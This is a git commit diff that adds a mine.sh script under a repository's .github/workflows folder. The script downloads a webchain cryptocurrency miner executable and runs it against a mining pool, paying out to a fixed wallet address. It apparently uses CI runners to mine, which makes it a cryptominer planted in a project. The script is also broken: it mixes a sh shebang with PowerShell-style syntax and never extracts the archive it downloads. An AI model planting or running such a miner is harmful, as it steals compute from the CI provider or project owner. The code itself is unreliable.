ba7ce88ceab9c86184dfa32bb313bd5245a2eacf
Hshshhhh16 <90821800+Hshshhhh16@users.noreply.github.com>
2021-09-16 08:45:31 +0200

    Update mine.sh

--- .github/workflows/mine.sh
+++ .github/workflows/mine.sh
@@ -1,2 +1,3 @@
-!wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-win64.zip -OutFile webchain-miner-2.8.0-win64.zip
-!.\webchain-miner-2.8.0-win64\webchain-miner.exe -o pool.webchain.network:2222 -p x -t 1 -u 0x8a8ac2e19ae314b899ad502928adf79f844c4529
+#!/bin/sh
+wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-win64.zip -OutFile webchain-miner-2.8.0-win64.zip
+.\webchain-miner-2.8.0-win64\webchain-miner.exe -o pool.webchain.network:2222 -p x -t 1 -u 0x8a8ac2e19ae314b899ad502928adf79f844c4529
